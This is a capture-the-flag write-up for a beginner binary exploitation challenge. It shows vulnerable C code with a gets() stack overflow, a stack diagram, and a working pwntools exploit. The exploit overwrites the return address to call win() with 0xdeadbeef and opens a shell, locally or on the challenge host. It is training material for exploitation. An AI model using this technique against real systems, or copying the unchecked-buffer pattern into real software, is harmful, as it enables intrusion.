## Intro to PWN 3

Start by running checksec on the binary.

![checksec](./screenshots/checksec.png)

We have a 32 bit binary.  NX is enabled but PIE is not.  Once again we can put static addresses into our exploit.  We have source code.  Lets view it.

#### main.c
```C
#include <stdlib.h> 
#include <stdio.h> 

void win(unsigned int x){ 
    if (x != 0xdeadbeef){
        puts("Almost...");
	return;
    }
    system("/bin/sh");
} 

void vuln(){
    char buf[24]; 
    gets(buf); 
} 

int main(){ 
    puts("Level 3: Args too?\n"); 
    vuln(); 
    return 0; 
} 
```

Once again we need to jump to the win() function to get a shell.  However we need to set the x argument to "0xdeadbeef".  It's important to note that for i386 executable the arguments are passed in on the stack.  If we have a buffer overflow we can overwrite arguments passed to win. Here is what the stack looks like for the vuln function.

![stack_frame](./screenshots/stack_frame.png)

This time we need to skip 36 bytes and append the address of win() in little endian.  Then we need to place 0xdeadbeef into the first argument.  This will be the next address on the stack.  However, when the win function is called, a new return address will be place on the stack and the stack pointer will move down 4 bytes.  Here is a visual representation of the stack after the buffer is placed and when win() is called.

```
________________buffer overflow_________________        ________________win() function________________
          |------------|                                          |------------|
$esp + 44 | 0xdeadbeef | Argument 1                     $esp + 12 | 0xdeadbeef | Argument 1
$esp + 40 | 0x42424242 | skip 4 bytes                   $esp + 8  |  ret addr  | next address in main
$esp + 36 |    win()   | address of win function        $esp + 4  |    ebp     | frame pointer
$esp + 32 | 0x41414141 | buffer (ebp)                   $esp      |   unused   | first stack variable
               ...                                                |------------|
$esp      | 0x41414141 | buffer
          |------------|
```

Use objdump to get the address of win().

![jump_address](./screenshots/jump_address.png)

Lets write our exploit.

#### exploit.py
```python
from pwn import *
import sys

binary = context.binary = ELF("./dist/pwnme")

if not args.REMOTE:
    p = process(binary.path)
else:
    p = remote('0.cloud.chals.io', 28949)

payload =  b""
payload += b"A" * 36
payload += p32(binary.sym.win)
payload += b"B" * 4
payload += p32(0xdeadbeef)

with open("payload", "wb") as fp:
    fp.write(payload)

p.sendline(payload)
p.interactive()
```

Run the exploit.

![exploit](./screenshots/exploit.png)

Complete!